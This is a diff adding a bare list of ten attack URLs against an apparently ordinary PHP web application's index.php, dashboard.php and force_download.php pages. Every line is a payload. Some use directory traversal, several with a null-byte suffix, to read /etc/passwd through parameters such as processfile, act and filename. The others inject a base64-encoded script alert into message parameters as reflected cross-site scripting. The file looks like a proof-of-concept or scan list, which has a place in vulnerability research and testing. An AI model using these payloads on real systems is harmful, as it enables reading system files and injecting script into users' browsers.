@@ -1,0 +1,11 @@
+http://www.example.com/index.php?mode=login&processfile=../../../../../../etc/passwd%00
+http://www.example.com/index.php?msg=PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ%2b
+http://www.example.com/modules/forcedownload/force_download.php?filename=../../../../../../../etc/passwd
+http://www.example.com/index.php?act=../../../../../../etc/passwd%00
+http://www.example.com/dashboard.php?act=../../../../../../../etc/passwd%00
+http://www.example.com/index.php?msg=PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ%2b
+http://www.example.com/dashboard.php?msg_error=PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ%2b
+http://www.example.com/dashboard.php?msg_okay=PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ%2b
+http://www.example.com/dashboard.php?msg_info=PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ%2b
+http://www.example.com/dashboard.php?msg_attention=PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ%2b
+
